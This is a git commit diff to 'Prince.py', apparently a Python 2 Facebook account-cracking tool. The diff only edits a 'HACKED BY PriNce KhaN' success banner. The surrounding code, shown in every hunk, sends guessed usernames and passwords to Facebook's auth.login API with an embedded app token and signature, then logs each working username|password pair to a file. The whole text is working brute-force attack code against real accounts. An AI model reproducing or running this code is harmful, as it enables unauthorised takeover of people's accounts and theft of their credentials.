0b79b32e0aaf957ee63570a22d84f1c0ec14d139
Prince-khan4077 <87693464+Prince-khan4077@users.noreply.github.com>
2021-07-24 20:00:08 +0500

    Add files via upload

--- Prince.py
+++ Prince.py
@@ -251,7 +251,7 @@ def action():
 			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			q = json.load(data)
 			if 'access_token' in q:
-				print '\x1b[1;92m[ iD iZ Ok =HACKED BY PriNce KhaN ]\x1b[1;92m-\x1b[1;92m(u)\x1b[1;92m-' + k + c + user + '-\x1b[1;92m(p)\x1b[1;92m-' + pass1																				
+				print '\x1b[1;92m[  =HACKED BY PriNce KhaN ]\x1b[1;92m-\x1b[1;92m(u)\x1b[1;92m-' + k + c + user + '-\x1b[1;92m(p)\x1b[1;92m-' + pass1																				
 				okb = open('save/successfull.txt', 'a')
 				okb.write(k+c+user+'|'+pass1+'\n')
 				okb.close()
@@ -268,7 +268,7 @@ def action():
 					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			                q = json.load(data)
 					if 'access_token' in q:
-		                        	print '\x1b[1;92m[ iD iZ Ok =HACKED BY PriNce KhaN ]\x1b[1;92m-\x1b[1;92m(u)\x1b[1;92m-' + k + c + user + '-\x1b[1;92m(p)\x1b[1;92m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;91m-' + pass2                            											
+		                        	print '\x1b[1;92m[  =HACKED BY PriNce KhaN ]\x1b[1;92m-\x1b[1;92m(u)\x1b[1;92m-' + k + c + user + '-\x1b[1;92m(p)\x1b[1;92m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;91m-' + pass2                            											
 						okb = open('save/successfull.txt', 'a')
 						okb.write(k+c+user+'|'+pass2+'\n')
 						okb.close()
@@ -285,7 +285,7 @@ def action():
 							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			                                q = json.load(data)
 							if 'access_token' in q:
-								print '\x1b[1;92m[ iD iZ Ok =HACKED BY PriNce KhaN ]\x1b[1;92m-\x1b[1;92m(u)\x1b[1;92m-' + k + c + user + '-\x1b[1;92m(p)\x1b[1;92m-' + pass3
+								print '\x1b[1;92m[  =HACKED BY PriNce KhaN ]\x1b[1;92m-\x1b[1;92m(u)\x1b[1;92m-' + k + c + user + '-\x1b[1;92m(p)\x1b[1;92m-' + pass3
 								okb = open('save/successfull.txt', 'a')
 								okb.write(k+c+user+'|'+pass3+'\n')
 								okb.close()
@@ -301,7 +301,7 @@ def action():
 							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			                                q = json.load(data)
 							if 'access_token' in q:
-								print '\x1b[1;92m[ iD iZ Ok =HACKED BY PriNce KhaN ]\x1b[1;92m-\x1b[1;92m(u)\x1b[1;92m-' + k + c + user + '-\x1b[1;92m(p)\x1b[1;92m-' + pass3
+								print '\x1b[1;92m[  =HACKED BY PriNce KhaN ]\x1b[1;92m-\x1b[1;92m(u)\x1b[1;92m-' + k + c + user + '-\x1b[1;92m(p)\x1b[1;92m-' + pass3
 								okb = open('save/successfull.txt', 'a')
 								okb.write(k+c+user+'|'+pass3+'\n')
 								okb.close()
